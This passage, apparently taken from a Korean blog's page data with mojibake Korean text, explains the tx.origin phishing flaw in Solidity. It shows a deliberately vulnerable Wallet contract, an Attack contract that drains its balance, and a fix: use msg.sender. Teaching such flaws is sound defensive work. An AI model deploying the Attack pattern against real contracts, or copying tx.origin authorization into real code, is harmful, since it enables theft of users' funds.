keyword\">function</span> <span class=\"token function\">transferTo</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> dest<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token comment\">// THE BUG IS RIGHT HERE, you must use msg.sender instead of tx.origin</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">.</span>origin <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        dest<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">contract Wallet {\r\n    address public owner;\r\n\r\n    constructor() payable {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function transfer(address payable _to, uint _amount) public {\r\n        require(tx.origin == owner, \"Not owner\");\r\n\r\n        (bool sent, ) = _to.call{value: _amount}(\"\");\r\n        require(sent, \"Failed to send Ether\");\r\n    }\r\n}\r\n\r\ncontract Attack {\r\n    address payable public owner;\r\n    Wallet wallet;\r\n\r\n    constructor(Wallet _wallet) {\r\n        wallet = Wallet(_wallet);\r\n        owner = payable(msg.sender);\r\n    }\r\n\r\n    function attack() public {\r\n        wallet.transfer(owner, address(wallet).balance);\r\n    }\r\n}</code></pre></div>\n<p>ì‹œë‚˜ë¦¬ì˜¤ëŠ” ì´ë ‡ë‹¤.</p>\n<ol>\n<li>Aê°€ 10 Etherì™€ í•¨ê»˜ Wallet contractë¥¼ ë°°í¬í•œë‹¤.</li>\n<li>Bê°€ Attack contractë¥¼ Wallet contractì˜ ì£¼ì†Œì™€ í•¨ê¼ ë°°í¬í•œë‹¤.</li>\n<li>Aê°€ Attack contractì˜ attack()ì„ callí•œë‹¤.</li>\n<li>BëŠ” Aliceì˜ Etherë¥¼ ë‹¤ ê°€ì ¸ì˜¤ê²Œ ëœë‹¤.</li>\n</ol>\n<p>â€œëˆ„ê°€ ì†ì•„ì„œ attack()ì„ callí•´!â€ í•  ìˆ˜ ìˆì§€ë§Œ ì¶©ë¶„íˆ ì¼ì–´ë‚  ìˆ˜ ìˆë‹¤ê³  ìƒê°ëœë‹¤.</p>\n<hr>\n<h2 id=\"how-to-prevent\" style=\"position:relative;\"><a href=\"#how-to-prevent\" aria-label=\"how to prevent permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to prevent?</h2>\n<p>solidity docsì—ì„œë„ tx.originì„ authorization ì‚¬ìš©í•˜ì§€ ì•Šì„ ê²ƒì„ ê¶Œì¥í•˜ê³  ìˆë‹¤. ë˜í•œ tx.originì€ ì‚¬ë¼ì§ˆ ìˆ˜ë„ ìˆë‹¤ê³  í•œë‹¤! ê·¸ëŸ¬ë‹ˆ ì•ìœ¼ë¡œ msg.senderë¥¼ ì‚¬ìš©í•˜ë„ë¡ í•˜ì</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">Besides the issue with authorization, there is a chance that tx.origin will be removed from the Ethereum protocol in the future, so code that uses tx.origin won't be compatible with future releases Vitalik: 'Do NOT assume that tx.origin will continue to be usable or meaningful.'</code></pre></div>\n<hr>\n<h2 id=\"ë§ˆë¬´ë¦¬\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"ë§ˆë¬´ë¦¬ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë§ˆë¬´ë¦¬</h2>\n<p>ì •ë§ ê°„ë‹¨í•˜ê²Œ ê³ ì¹  ìˆ˜ ìˆëŠ” ë¶€ë¶„ì´ë¼ê³  ìƒê°ì´ ë“ ë‹¤. ê·¸ë¦¬ê³  ë™ì‹œì— ì´ëŸ° ì‚¬ì†Œí•œ ì‹¤ ìˆ˜ í•˜ë‚˜ê°€ í° ì˜í–¥ì„ ë¯¸ì¹  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì´ ë†€ëë‹¤. ì•ìœ¼ë¡œ tx.origin ë§ê³  msg.senderë¥¼ ê¼­ ì‚¬ìš©í•˜ì!!!</p>\n<h3 id=\"reference\" style=\"position:relative;\"><a href=\"#reference\" aria-label=\"reference permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reference</h3>\n<ul>\n<li><a href=\"https://davidkathoh.medium.com/tx-origin-vs-msg-sender-93db7f234cb9\">https://davidkathoh.medium.com/tx-origin-vs-msg-sender-93db7f234cb9</a></li>\n<li><a href=\"https://solidity-by-example.org/hacks/phishing-with-tx-origin/\">https://solidity-by-example.org/hacks/phishing-with-tx-origin/</a></li>\n<li><a href=\"https://docs.soliditylang.org/en/v0.8.10/security-considerations.html\">https://docs.soliditylang.org/en/v0.8.10/security-considerations.html</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#txorigin-vs-msgsender\">txorigin vs msg.sender</a></p>\n</li>\n<li>\n<p><a href=\"#example-code\">Example Code</a></p>\n</li>\n<li>\n<p><a href=\"#how-to-prevent\">How to prevent?</a></p>\n</li>\n<li>\n<p><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">ë§ˆë¬´ë¦¬</a></p>\n<ul>\n<li><a href=\"#reference\">Reference</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"January 03, 2022","title":"(ì·¨ì•½ì  ì‹œë¦¬ì¦ˆ 8) tx.origin","categories":"ì·¨ì•½ì ë¶„ì„","author":"í•œì„±ì›","emoji":"ğŸ§¢"},"fields":{"slug":"/vulnerability/tx.origin/tx_origin/"}},"site":{"siteMetadata":{"siteUrl":"https://holyhansss.github.io","comments":{"utterances":{"repo":""}}}}},"pageContext":{"slug":"/ethernaut/2_fallout_ethernaut/2_fallout_ethernaut/","nextSlug":"/ethernaut/1_fallback_ethernaut/1_fallback_ethernaut/","prevSlug":"/vulnerability/tx.origin/tx_origin/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}